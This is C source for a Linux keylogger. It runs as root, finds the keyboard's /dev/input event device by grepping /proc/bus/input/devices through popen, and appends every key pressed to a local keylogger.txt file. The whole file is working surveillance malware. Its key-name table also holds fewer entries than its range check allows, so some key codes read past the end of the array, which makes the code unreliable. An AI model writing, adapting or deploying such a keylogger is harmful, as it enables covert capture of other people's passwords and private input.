#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>


char *getevent();
char *keys[] = {
    " RESERVED ", " ESC ", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", " MINUS ", " EQUAL ", " BACKSPACE ",
    " TAB ", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", " LEFTBRACE ", " RIGHTBRACE ", " ENTER ",
    " LEFTCTRL ", "a", "s", "d", "f", "g", "h", "j", "k", "l", "ñ", " SEMICOLON ", " APOSTROPHE ", " GRAVE ",
    " LEFTSHIFT ", " BACKSLASH ", "z", "x", "c", "v", "b", "n", "m", " COMMA ", " DOT ", " SLASH ", " RIGHTSHIFT ",
    " KPASTERISK ", " LEFTALT ", " SPACE ", " CAPSLOCK ", " F1 ", " F2 ", " F3 ", " F4 ", " F5 ", " F6 ", " F7 ", " F8 ", " F9 ", " F10 ",
    " NUMLOCK ", " SCROLLLOCK ", " K7 ", " K8 ", " K9 ", " KPMINUS ", " K4 ", " K5 ", " K6 ", " KPPLUS ", " K1 ", " K2 ", " K3 ", " K0 ", " KPDOT "
};

int main(int argc, char **argv){
   if(geteuid() !=0 )
      exit(1);
   static char dir_event[20] = "/dev/input/" ;  
   strcat(dir_event, getevent());
   
   int id = open(dir_event, O_RDONLY);
   if(id == -1)
      exit(2);
      
   struct input_event event;   
   while(read(id, &event, sizeof(event)) > 0 ){
   
      FILE *txt = fopen("./keylogger.txt", "a");
      if(!txt) break;
      if(event.type == EV_KEY && event.value == 1 && event.code < 112)
         fprintf(txt, "%s", keys[event.code]);
      fclose(txt);   
   }
   
   return 0x0;
}
char *getevent(){
   char *comando = (char *)
      "grep -E 'Handlers|EV' /proc/bus/input/devices | "
      "grep -E -B1 120013 |"
      "grep -E -o event[0-9]";
   static char event[8];
   FILE *Comandos = popen(comando, "r");
   if(!Comandos)
      exit(1);
   fgets(event, 8, Comandos);
   pclose(Comandos);
   event[strlen(event) - 1] = 0x0;
   return event;
}



